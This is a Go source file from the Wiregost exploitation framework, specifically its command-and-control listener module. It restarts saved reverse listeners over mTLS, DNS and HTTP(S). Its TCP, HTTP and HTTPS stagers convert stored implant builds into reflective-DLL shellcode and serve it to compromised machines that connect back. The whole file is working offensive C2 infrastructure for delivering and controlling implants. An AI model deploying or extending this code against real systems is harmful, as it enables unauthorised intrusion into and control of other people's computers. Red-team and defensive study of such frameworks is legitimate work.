// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package c2

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/evilsocket/islazy/fs"
	"github.com/evilsocket/islazy/tui"

	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/db"
	"github.com/maxlandon/wiregost/server/generate"
)

var persist = fmt.Sprintf("%s[P]%s ", tui.GREEN, tui.RESET)

// SpawnPersistentListeners - Starts all listeners saved in DB
func SpawnPersistentListeners() error {

	bucket, err := db.GetBucket(ListenerBucketName)
	if err != nil {
		return err
	}

	// Get all listener configs
	ls, err := bucket.List(ListenerNamespace)
	listeners := []*ListenerConfig{}
	for _, listener := range ls {
		rawListener, err := bucket.Get(listener)
		if err != nil {
			fmt.Println(err)
		}
		config := &ListenerConfig{}
		err = json.Unmarshal(rawListener, config)
		if err != nil {
			fmt.Println(err)
		}
		listeners = append(listeners, config)
	}

	if len(ls) != 0 {
		fmt.Printf("%s[*]%s Spawning persistent listeners:\n", tui.BLUE, tui.RESET)
		// Spawn listener for each config
		for _, listener := range listeners {
			err := SpawnListener(listener)
			if err != nil {
				fmt.Println(err)
			}
		}
	}

	return nil
}

// SpawnListener - Start an individual listener
func SpawnListener(config *ListenerConfig) error {

	switch config.Name {
	case "mTLS":
		err := SpawnMTLS(config)
		if err != nil {
			return err
		}
	case "DNS":
		err := SpawnDNS(config)
		if err != nil {
			return err
		}
	case "HTTPS":
		err := SpawnHTTPS(config)
		if err != nil {
			return err
		}
	case "HTTP":
		err := SpawnHTTP(config)
		if err != nil {
			return err
		}
	case "TCP stager":
		err := SpawnTCPStager(config)
		if err != nil {
			return err
		}
	case "HTTP stager":
		err := SpawnHTTPStager(config)
		if err != nil {
			return err
		}
	case "HTTPS stager":
		err := SpawnHTTPSStager(config)
		if err != nil {
			return err
		}
	}
	fmt.Println()

	return nil
}

// SpawnMTLS - MTLS
func SpawnMTLS(config *ListenerConfig) error {

	ln, err := StartMutualTLSListener(config.LHost, config.LPort)
	if err != nil {
		return err
	}

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "mTLS",
		Description: fmt.Sprintf("%sMutual TLS listener", persist),
		Protocol:    "tcp",
		Port:        config.LPort,
		JobCtrl:     make(chan bool),
	}

	go func() {
		<-job.JobCtrl
		storageLog.Infof("Stopping mTLS listener (%d) ...", job.ID)
		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	fmt.Printf("Persistent Reverse Mutual TLS listener started at %s:%d", config.LHost, config.LPort)
	return nil
}

// SpawnHTTP - HTTP
func SpawnHTTP(config *ListenerConfig) error {

	return nil
}

// SpawnHTTPS - HTTPS
func SpawnHTTPS(config *ListenerConfig) error {

	addr := fmt.Sprintf("%s:%d", config.LHost, config.LPort)
	certFile, _ := fs.Expand(config.Certificate)
	keyFile, _ := fs.Expand(config.Key)
	cert, key, err := getLocalCertificatePair(certFile, keyFile)
	if err != nil {
		return fmt.Errorf("Failed to load local certificate %v", err)
	}

	conf := &HTTPServerConfig{
		Addr:    addr,
		LPort:   config.LPort,
		Secure:  true,
		Domain:  config.HTTPDomain,
		Website: config.Website,
		Cert:    cert,
		Key:     key,
		ACME:    config.LetsEncrypt,
	}

	server := StartHTTPSListener(conf)
	if server == nil {
		return errors.New("HTTP Server instantiation failed")
	}

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "HTTPS",
		Description: fmt.Sprintf("%sHTTPS C2 server (https for domain %s)", persist, conf.Domain),
		Protocol:    "tcp",
		Port:        config.LPort,
		JobCtrl:     make(chan bool),
	}

	core.Jobs.AddJob(job)
	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		var err error
		if server.Conf.ACME {
			err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
		} else {
			err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
		}
		if err != nil {
			storageLog.Errorf("HTTPS listener error %v", err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}

	}()

	go func() {
		<-job.JobCtrl
		once.Do(func() { cleanup(nil) })
	}()

	fmt.Printf("Reverse HTTPS listener started at %s:%d", config.LHost, config.LPort)
	return nil
}

// SpawnDNS - DNS
func SpawnDNS(config *ListenerConfig) error {

	server := StartDNSListener(config.DNSDomains, config.EnableCanaries)
	description := fmt.Sprintf("%s%s (canaries %v)", persist, strings.Join(config.DNSDomains, " "), config.EnableCanaries)

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "DNS",
		Description: description,
		Protocol:    "udp",
		Port:        53,
		JobCtrl:     make(chan bool),
	}

	go func() {
		<-job.JobCtrl
		storageLog.Infof("Stopping DNS listener (%d) ...", job.ID)
		server.Shutdown()

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	// There is no way to call DNS's ListenAndServe() without blocking
	// but we also need to check the error in the case the server
	// fails to start at all, so we setup all the Job mechanics
	// then kick off the server and if it fails we kill the job
	// ourselves.
	go func() {
		err := server.ListenAndServe()
		if err != nil {
			storageLog.Errorf("DNS listener error %v", err)
			job.JobCtrl <- true
		}
	}()

	fmt.Printf("Reverse DNS listener started with parent domain(s) %v...", strings.Join(config.DNSDomains, ","))
	return nil
}

// SpawnTCPStager - TCP Stager
func SpawnTCPStager(config *ListenerConfig) error {

	conf := &generate.GhostConfig{}
	ghostBytes := []byte{}
	var err error
	if config.ImplantStage == "" {
		return errors.New("You must specify a Ghost implant build (shellcode/shared_lib) name")
	}
	// Find all ghost names
	ghosts, _ := generate.GhostFiles()
	for _, g := range ghosts {
		ghost := strings.TrimPrefix(g, ".")
		// If ghost is found in names...
		if ghost == config.ImplantStage {
			// Fetch config for checking format
			conf, err = generate.GhostConfigByName(ghost)
			if err != nil {
				return errors.New("Cannot find Implant config: Impossible to check its format")
			}
			// If format is good, keep the bytes
			if (conf.Format == pb.GhostConfig_SHARED_LIB) || (conf.Format == pb.GhostConfig_SHELLCODE) {
				ghostBytes, err = generate.GhostFileByName(ghost)
				break
			} else {
				return errors.New("Wrong format: The provided Ghost Implant Stage is of format EXECUTABLE")
			}
		}
	}
	if len(ghostBytes) == 0 {
		return errors.New("The provided Implant Stage does not exist in DB")
	}

	// Generate the Shellcode to attach to stager listener
	ghostShellcode, err := generate.ShellcodeRDIFromBytes(ghostBytes, "RunGhost", "")
	if err != nil {
		shellcodeError := fmt.Sprintf("Error generating listener stage: %s", err.Error())
		return errors.New(shellcodeError)
	}

	// Start listener
	ln, err := StartTCPListener(config.LHost, config.LPort, ghostShellcode)
	if err != nil {
		return err
	}

	job := &core.Job{
		ID:   core.GetJobID(),
		Name: "TCP stager",
		Description: fmt.Sprintf("%sReverse TCP stager listener, serving %s%s%s (%s/%s) as shellcode",
			persist, tui.YELLOW, config.ImplantStage, tui.RESET, conf.GOOS, conf.GOARCH),
		Protocol: "tcp",
		Port:     config.LPort,
		JobCtrl:  make(chan bool),
	}
	go func() {
		<-job.JobCtrl
		storageLog.Infof("Stopping TCP Stager listener (%d) ...", job.ID)
		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	fmt.Printf("Reverse TCP Stager listener started at %s:%d, serving %s as shellcode", config.LHost, config.LPort, config.ImplantStage)
	return nil
}

// SpawnHTTPStager - HTTP stager
func SpawnHTTPStager(config *ListenerConfig) error {

	conf := &generate.GhostConfig{}
	ghostBytes := []byte{}
	var err error
	if config.ImplantStage == "" {
		return errors.New("You must specify a Ghost implant build (shellcode/shared_lib) name")
	}
	// Find all ghost names
	ghosts, _ := generate.GhostFiles()
	for _, g := range ghosts {
		ghost := strings.TrimPrefix(g, ".")
		// If ghost is found in names...
		if ghost == config.ImplantStage {
			// Fetch config for checking format
			conf, err = generate.GhostConfigByName(ghost)
			if err != nil {
				return errors.New("Cannot find Implant config: Impossible to check its format")
			}
			// If format is good, keep the bytes
			if (conf.Format == pb.GhostConfig_SHARED_LIB) || (conf.Format == pb.GhostConfig_SHELLCODE) {
				ghostBytes, err = generate.GhostFileByName(ghost)
				break
			} else {
				return errors.New("Wrong format: The provided Ghost Implant Stage is of format EXECUTABLE")
			}
		}
	}
	if len(ghostBytes) == 0 {
		return errors.New("The provided Implant Stage does not exist in DB")
	}

	// Generate the Shellcode to attach to stager listener
	ghostShellcode, err := generate.ShellcodeRDIFromBytes(ghostBytes, "RunGhost", "")
	if err != nil {
		shellcodeError := fmt.Sprintf("Error generating listener stage: %s", err.Error())
		return errors.New(shellcodeError)
	}

	// Start HTTP listener
	httpConf := &HTTPServerConfig{
		Addr:   fmt.Sprintf("%s:%d", config.LHost, config.LPort),
		LPort:  config.LPort,
		Domain: config.LHost,
		Secure: false,
		ACME:   false,
	}
	server := StartHTTPSListener(httpConf)
	name := "http"
	server.GhostShellcode = ghostShellcode

	job := &core.Job{
		ID:   core.GetJobID(),
		Name: "HTTP stager",
		Description: fmt.Sprintf("%sReverse HTTP stager listener (domain: %s%s%s), serving %s%s%s (%s/%s) as shellcode",
			persist, tui.BLUE, httpConf.Domain, tui.RESET, tui.YELLOW, config.ImplantStage, tui.RESET, conf.GOOS, conf.GOARCH),
		Protocol: "tcp",
		Port:     config.LPort,
		JobCtrl:  make(chan bool),
	}

	core.Jobs.AddJob(job)

	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		err := server.HTTPServer.ListenAndServe()
		if err != nil {
			storageLog.Errorf("%s listener error %v", name, err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}
	}()

	go func() {
		<-job.JobCtrl
		storageLog.Infof("Stopping HTTP Stager listener (%d) ...", job.ID)
		once.Do(func() { cleanup(nil) })
	}()

	fmt.Printf("Reverse HTTP Stager listener started at %s:%d (domain: %s), serving %s as shellcode",
		config.LHost, config.LPort, httpConf.Domain, config.ImplantStage)
	return nil
}

// SpawnHTTPSStager - HTTPS stager
func SpawnHTTPSStager(config *ListenerConfig) error {

	conf := &generate.GhostConfig{}
	ghostBytes := []byte{}
	var err error
	if config.ImplantStage == "" {
		return errors.New("You must specify a Ghost implant build (shellcode/shared_lib) name")
	}
	// Find all ghost names
	ghosts, _ := generate.GhostFiles()
	for _, g := range ghosts {
		ghost := strings.TrimPrefix(g, ".")
		// If ghost is found in names...
		if ghost == config.ImplantStage {
			// Fetch config for checking format
			conf, err = generate.GhostConfigByName(ghost)
			if err != nil {
				return errors.New("Cannot find Implant config: Impossible to check its format")
			}
			// If format is good, keep the bytes
			if (conf.Format == pb.GhostConfig_SHARED_LIB) || (conf.Format == pb.GhostConfig_SHELLCODE) {
				ghostBytes, err = generate.GhostFileByName(ghost)
				break
			} else {
				return errors.New("Wrong format: The provided Ghost Implant Stage is of format EXECUTABLE")
			}
		}
	}
	if len(ghostBytes) == 0 {
		return errors.New("The provided Implant Stage does not exist in DB")
	}

	// Generate the Shellcode to attach to stager listener
	ghostShellcode, err := generate.ShellcodeRDIFromBytes(ghostBytes, "RunGhost", "")
	if err != nil {
		shellcodeError := fmt.Sprintf("Error generating listener stage: %s", err.Error())
		return errors.New(shellcodeError)
	}

	// Start HTTP listener
	httpConf := &HTTPServerConfig{
		Addr:   fmt.Sprintf("%s:%d", config.LHost, config.LPort),
		LPort:  config.LPort,
		Domain: config.LHost,
		Secure: true,
		ACME:   true,
	}
	server := StartHTTPSListener(httpConf)
	name := "https"
	server.GhostShellcode = ghostShellcode

	job := &core.Job{
		ID:   core.GetJobID(),
		Name: "HTTPS stager",
		Description: fmt.Sprintf("%sReverse HTTPS stager listener (domain: %s%s%s), serving %s%s%s (%s/%s) as shellcode",
			persist, tui.BLUE, httpConf.Domain, tui.RESET, tui.YELLOW, config.ImplantStage, tui.RESET, conf.GOOS, conf.GOARCH),
		Protocol: "tcp",
		Port:     config.LPort,
		JobCtrl:  make(chan bool),
	}

	core.Jobs.AddJob(job)

	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		err := server.HTTPServer.ListenAndServeTLS("", "")
		if err != nil {
			storageLog.Errorf("%s listener error %v", name, err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}
	}()

	go func() {
		<-job.JobCtrl
		storageLog.Infof("Stopping HTTPS Stager listener (%d) ...", job.ID)
		once.Do(func() { cleanup(nil) })
	}()

	fmt.Printf("Reverse HTTPS Stager listener started at %s:%d (domain: %s), serving %s as shellcode",
		config.LHost, config.LPort, httpConf.Domain, config.ImplantStage)
	return nil
}

// HTTPS HELPER FUNCTIONS --------------------------------------------------------------------------------//

func getLocalCertificatePair(certFile, keyFile string) ([]byte, []byte, error) {
	if certFile == "" && keyFile == "" {
		return nil, nil, nil
	}
	cert, err := ioutil.ReadFile(certFile)
	if err != nil {
		return nil, nil, err
	}
	key, err := ioutil.ReadFile(keyFile)
	if err != nil {
		return nil, nil, err
	}
	return cert, key, nil
}

// Fuck'in Go - https://stackoverflow.com/questions/30815244/golang-https-server-passing-certfile-and-kyefile-in-terms-of-byte-array
// basically the same as server.ListenAndServerTLS() but we can pass in byte slices instead of file paths
func listenAndServeTLS(srv *http.Server, certPEMBlock, keyPEMBlock []byte) error {
	addr := srv.Addr
	if addr == "" {
		addr = ":https"
	}
	config := &tls.Config{}
	if srv.TLSConfig != nil {
		*config = *srv.TLSConfig
	}
	if config.NextProtos == nil {
		config.NextProtos = []string{"http/1.1"}
	}

	var err error
	config.Certificates = make([]tls.Certificate, 1)
	config.Certificates[0], err = tls.X509KeyPair(certPEMBlock, keyPEMBlock)
	if err != nil {
		return err
	}

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	tlsListener := tls.NewListener(tcpKeepAliveListener{ln.(*net.TCPListener)}, config)
	return srv.Serve(tlsListener)
}

// tcpKeepAliveListener sets TCP keep-alive timeouts on accepted
// connections. It's used by ListenAndServe and ListenAndServeTLS so
// dead TCP connections (e.g. closing laptop mid-download) eventually
// go away.
type tcpKeepAliveListener struct {
	*net.TCPListener
}

func (ln tcpKeepAliveListener) Accept() (c net.Conn, err error) {
	tc, err := ln.AcceptTCP()
	if err != nil {
		return
	}
	tc.SetKeepAlive(true)
	tc.SetKeepAlivePeriod(3 * time.Minute)
	return tc, nil
}
